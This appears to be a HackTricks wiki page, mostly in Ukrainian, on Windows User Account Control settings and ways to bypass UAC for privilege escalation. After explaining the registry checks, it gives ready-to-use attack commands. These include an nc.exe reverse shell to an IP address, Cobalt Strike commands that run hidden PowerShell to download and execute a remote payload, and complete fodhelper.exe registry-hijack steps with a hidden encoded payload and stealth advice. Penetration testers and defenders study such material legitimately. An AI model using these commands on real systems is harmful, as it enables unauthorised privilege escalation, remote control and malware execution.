# UAC - Контроль облікових записів користувача

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка забезпечує запит на згоду для підвищених дій. Застосунки мають різні `integrity` рівні, і програма з **високим рівнем** може виконувати завдання, які **потенційно можуть скомпрометувати систему**. Коли UAC увімкнено, застосунки та завдання завжди **запускаються в контексті облікового запису звичайного користувача**, якщо адміністратор явно не надає цим застосункам/завданням доступ рівня адміністратора для виконання. Це зручна функція, яка захищає адміністраторів від ненавмисних змін, але не вважається межею безпеки.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC увімкнено, користувачу-адміністратору надаються 2 токени: стандартний токен для виконання звичайних дій як звичайний користувач і ще один токен з привілеями адміністратора.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) детально описує, як працює UAC, включно з процесом входу, користувацьким досвідом та архітектурою UAC. Адміністратори можуть використовувати політики безпеки для конфігурації роботи UAC на локальному рівні (через secpol.msc) або налаштовувати та розгортати їх через Group Policy Objects (GPO) в середовищі Active Directory. Різні налаштування детально описані [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Існує 10 налаштувань Group Policy, які можна задати для UAC. Нижче наведена додаткова інформація:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Деякі програми **автопідвищуються автоматично** якщо **користувач належить** до групи **administrators**. Такі бінарні файли у своїх _**Manifests**_ мають опцію _**autoElevate**_ зі значенням _**True**_. Також бінарник має бути **підписаний Microsoft**.

Багато процесів з авто-підвищенням надають **функціональність через COM-об'єкти або RPC-сервери**, які можуть бути викликані з процесів, що працюють із medium integrity (привілеї рівня звичайного користувача). Зверніть увагу, що COM (Component Object Model) та RPC (Remote Procedure Call) — це методи, які Windows-програми використовують для взаємодії та виконання функцій між процесами. Наприклад, **`IFileOperation COM object`** призначений для обробки файлових операцій (копіювання, видалення, переміщення) і може автоматично підвищити привілеї без запиту.

Зверніть увагу, що можуть виконуватися певні перевірки, наприклад перевірка, чи процес запущено з **System32 directory**, яку можна обійти, наприклад, **інжекцією в explorer.exe** або інший виконуваний файл, що знаходиться в System32.

Інший спосіб обійти ці перевірки — **змінити PEB**. Кожен процес у Windows має Process Environment Block (PEB), який містить важливі дані про процес, такі як шлях до виконуваного файлу. Змінивши PEB, атакуючі можуть підробити (spoof) місцезнаходження свого шкідливого процесу, змушуючи його виглядати так, ніби він запускається з довіреної директорії (наприклад, system32). Ця підроблена інформація обманює COM-об'єкт, щоб він автоматично підвищив привілеї без запиту.

Потім, щоб **обійти UAC** (підвищити з рівня medium integrity до high), деякі зловмисники використовують такі бінарні файли для **виконання довільного коду**, оскільки він буде виконаний із процесу з High level integrity.

Ви можете **перевірити** _**Manifest**_ бінарного файлу за допомогою інструменту _**sigcheck.exe**_ від Sysinternals. (`sigcheck.exe -m <file>`) Також ви можете **переглянути** рівень integrity процесів за допомогою _Process Explorer_ або _Process Monitor_ (від Sysinternals).

### Check UAC

Щоб підтвердити, чи UAC увімкнено, виконайте:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Якщо це **`1`**, то UAC **активовано**, якщо це **`0`** або воно **не існує**, то UAC **неактивний**.

Потім перевірте **який рівень** налаштований:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Якщо **`0`**, то UAC не буде запитувати підтвердження (як **відключено**)
- Якщо **`1`**, у адміністратора запитують ім'я користувача та пароль для запуску бінарного файлу з підвищеними правами (на Secure Desktop)
- Якщо **`2`** (**Завжди сповіщати мене**) UAC завжди вимагатиме підтвердження від адміністратора, коли він намагається виконати щось з високими привілеями (на Secure Desktop)
- Якщо **`3`** — як `1`, але не обов'язково на Secure Desktop
- Якщо **`4`** — як `2`, але не обов'язково на Secure Desktop
- Якщо **`5`** (значення за замовчуванням) — буде просити адміністратора підтвердити запуск non-Windows binaries з підвищеними правами

Далі слід поглянути на значення **`LocalAccountTokenFilterPolicy`**\
Якщо значення **`0`**, то лише користувач з **RID 500** (**built-in Administrator**) може виконувати **admin tasks without UAC**, а якщо **`1`**, **всі акаунти в групі "Administrators"** можуть це робити.

І, нарешті, подивіться значення ключа **`FilterAdministratorToken`**\
Якщо **`0`** (за замовчуванням), **built-in Administrator account** може виконувати завдання віддаленого адміністрування, а якщо **`1`**, вбудований обліковий запис Administrator **не може** виконувати віддалене адміністрування, якщо тільки `LocalAccountTokenFilterPolicy` не встановлено в `1`.

#### Summary

- Якщо `EnableLUA=0` або **не існує**, **UAC відсутній для всіх**
- Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=1`**, **UAC відсутній для всіх**
- Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` та `FilterAdministratorToken=0`**, **UAC відсутній для RID 500 (Built-in Administrator)**
- Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` та `FilterAdministratorToken=1`**, **UAC для всіх**

Всю цю інформацію можна зібрати за допомогою модуля **metasploit**: `post/windows/gather/win_privs`

Також ви можете перевірити групи вашого користувача та отримати рівень цілісності:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Зауважте, що якщо у вас є графічний доступ до жертви, UAC bypass досить простий, оскільки ви можете просто натиснути "Yes", коли з'являється UAC prompt

The UAC bypass is needed in the following situation: **UAC увімкнено, ваш процес працює в medium integrity context, і ваш користувач належить до administrators group**.

Важливо зазначити, що **набагато складніше обійти UAC, якщо він знаходиться на найвищому рівні безпеки (Always), ніж коли він знаходиться на будь-якому з інших рівнів (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** базовий UAC "bypass" (повний доступ до файлової системи)

Якщо у вас є shell під користувачем, який входить до групи Administrators, ви можете **монтувати шаринг C$** через SMB (файлова система) локально як новий диск і отримаєте **доступ до всього в файловій системі** (навіть до домашньої теки Administrator).

> [!WARNING]
> **Здається, цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Обхід UAC за допомогою cobalt strike

Техніки Cobalt Strike працюватимуть лише якщо UAC не встановлено на максимальний рівень безпеки.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** та **Metasploit** також мають кілька модулів для **bypass** **UAC**.

### KRBUACBypass

Документація та інструмент: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) який є **збіркою** кількох UAC bypass exploits. Зауважте, що вам потрібно **compile UACME using visual studio or msbuild**. Компіляція створить кілька виконуваних файлів (наприклад `Source\Akagi\outout\x64\Debug\Akagi.exe`), вам потрібно буде знати **який саме вам потрібен.**\
Ви повинні **бути обережними**, тому що деякі bypasses можуть **викликати запуск інших програм**, які **повідомлять** **користувача** про те, що щось відбувається.

UACME має **інформацію про версію збірки, з якої кожна техніка почала працювати**. Ви можете шукати техніку, що впливає на вашу версію:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Також, використовуючи [this](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінку, ви отримуєте випуск Windows `1607` за номерами збірок.

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений бінарник `fodhelper.exe` автоматично запускається з підвищеними правами в сучасних Windows. Під час запуску він читає наведений нижче пер-юзерський шлях реєстру без перевірки дієслова `DelegateExecute`. Розміщення команди там дозволяє процесу Medium Integrity (користувач належить до Administrators) створити процес High Integrity без UAC prompt.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell кроки (встановіть свій payload, потім trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Працює, коли поточний користувач є членом Administrators і рівень UAC за замовчуванням/лояльний (не Always Notify з додатковими обмеженнями).
- Використовуйте шлях `sysnative` щоб запустити 64-бітний PowerShell з 32-бітного процесу на 64-бітному Windows.
- Payload може бути будь-якою командою (PowerShell, cmd, або шлях до EXE). Уникайте виклику UI, що вимагають підтвердження, для стелсу.

#### Додаткові UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.

Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.

### Noisy brute-force UAC bypass

If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
